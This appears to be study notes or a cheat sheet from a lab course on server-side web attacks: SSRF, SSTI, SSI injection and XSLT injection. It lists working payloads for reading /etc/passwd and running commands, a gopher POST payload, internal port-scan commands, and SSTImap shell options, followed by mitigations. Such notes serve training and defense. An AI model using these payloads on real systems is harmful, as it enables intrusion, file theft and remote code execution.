# Server-side Attacks

## 🎯 Main Idea
- Server-side attacks target the web server/application itself (vs. client-side attacks like XSS).
- Covers four vulnerability classes: SSRF, SSTI, SSI Injection, and XSLT Injection.
- Common impact ladder: information disclosure → local file inclusion (LFI) → remote code execution (RCE) / internal network access.

## 💥 Attack / Exploit Vectors

### SSRF — Server-Side Request Forgery
- App fetches a remote resource from a user-supplied URL; attacker coerces requests to internal/arbitrary targets.
- Identify by pointing the URL param to your host (netcat) and to `127.0.0.1` to check if response is reflected (non-blind).
- Use it for internal port scanning, reaching restricted endpoints, LFI, and interacting with internal services.
- **Commands**
  - `http://127.0.0.1/index.php` — point app at itself (confirm reflected/non-blind SSRF)
  - `nc -lnvp 8000` — listener to confirm SSRF out-of-band
  - `seq 1 10000 > ports.txt` — build port wordlist
  - `ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"` — internal port scan
  - `ffuf -w raft-small-words.txt -u .../index.php -d "dateserver=http://dateserver.htb/FUZZ.php&date=..." -fr "Server at dateserver.htb Port 80"` — enumerate restricted endpoints
  - `file:///etc/passwd` — LFI via file:// scheme
  - `http://dateserver.htb/admin.php` — access restricted internal endpoint
  - `gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin` — gopher:// to send POST/arbitrary bytes (double URL-encode when nested)
  - `python2.7 gopherus.py --exploit smtp` — Gopherus generates gopher URLs (MySQL, Postgres, FastCGI, Redis, SMTP, etc.)

### Blind SSRF
- Response not reflected; impact limited to inference.
- Still usable for restricted port scan and file existence checks via differing error messages (e.g. `Something went wrong!` vs date-unavailable).
- Cannot read files/exfiltrate directly; can blindly hit internal apps with guessed payloads.

### SSTI — Server-Side Template Injection
- Occurs when user input reaches the template string (not just values) before rendering; template engine executes injected code.
- Confirm with error string `${{<%[%'"}}%\.`; then fingerprint engine (`${7*7}` → `{{7*7}}` → `{{7*'7'}}`: Jinja=`7777777`, Twig=`49`).
- **Commands (Jinja2 / Flask)**
  - `{{ 7*7 }}` / `{{7*'7'}}` — confirm & fingerprint engine
  - `{{ config.items() }}` — dump app configuration/secrets
  - `{{ self.__init__.__globals__.__builtins__ }}` — dump built-in functions
  - `{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}` — LFI
  - `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` — RCE
- **Commands (Twig / PHP)**
  - `{{ _self }}` — info disclosure
  - `{{ "/etc/passwd"|file_excerpt(1,-1) }}` — LFI (Symfony filter)
  - `{{ ['id'] | filter('system') }}` — RCE
- **Tooling**
  - `python3 sstimap.py -u http://172.17.0.2/index.php?name=test` — auto-detect SSTI & engine
  - `sstimap.py -u ... -D '/etc/passwd' './passwd'` — download file
  - `sstimap.py -u ... -S id` — run command
  - `sstimap.py -u ... --os-shell` — interactive shell

### SSI — Server-Side Includes Injection
- Inject SSI directives into a file served by the server (e.g. via file upload or reflected input written to `.shtml`/`.shtm`/`.stm`).
- Confirm with `<!--#printenv -->`; escalate to RCE with `exec`.
- **Commands (directives)**
  - `<!--#printenv -->` — print environment variables (confirm)
  - `<!--#config errmsg="Error!" -->` — change config/error message
  - `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` — print variables
  - `<!--#exec cmd="whoami" -->` / `<!--#exec cmd="id" -->` — execute command (RCE)
  - `<!--#include virtual="index.html" -->` — include a web-root file

### XSLT Injection
- User input inserted into XSL data before XSLT processing; attacker injects extra XSL elements.
- Confirm by injecting broken tag `<` (triggers 500 error), then info disclosure.
- **Commands (payloads)**
  - `<xsl:value-of select="system-property('xsl:version')" />` — info disclosure (also `xsl:vendor`, `xsl:vendor-url`, `xsl:product-name`, `xsl:product-version`)
  - `<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />` — LFI (XSLT 2.0+)
  - `<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />` — LFI via PHP function
  - `<xsl:value-of select="php:function('system','id')" />` — RCE via PHP function
- **Core XSL elements**: `<xsl:template match>`, `<xsl:value-of select>`, `<xsl:for-each select>`, `<xsl:sort>`, `<xsl:if test>`

## 🛠️ Key Tools & Concepts
- Burp Suite — intercept/modify requests to confirm and exploit
- ffuf — fuzz internal ports and endpoints through SSRF
- netcat (`nc -lnvp`) — out-of-band SSRF confirmation
- Gopherus — generate gopher:// payloads for internal services
- SSTImap (modern tplmap replacement) — detect/exploit SSTI
- URL schemes — `http(s)://`, `file://`, `gopher://`
- Template engines — Jinja (Python/Flask/Django), Twig (PHP/Symfony); rendering = template + values
- libxslt — common XSLT processor (XSLT 1.0); PayloadsAllTheThings SSTI cheat sheet

## 🛡️ Mitigations
- SSRF: whitelist allowed origins and URL schemes/protocols, sanitize input; network-layer firewall rules dropping outbound requests, network segmentation (OWASP SSRF Prevention Cheat Sheet)
- SSTI: never pass user input into the template string; sandbox/separate the rendering environment (e.g. Docker), remove dangerous functions (bypass-prone)
- SSI: validate/sanitize user input, restrict SSI to specific extensions/directories, disable `exec` if unneeded
- XSLT: keep user input out of XSL data before processing; HTML-encode (`<`→`&lt;`), run processor low-privilege, disable PHP/external functions, keep library updated
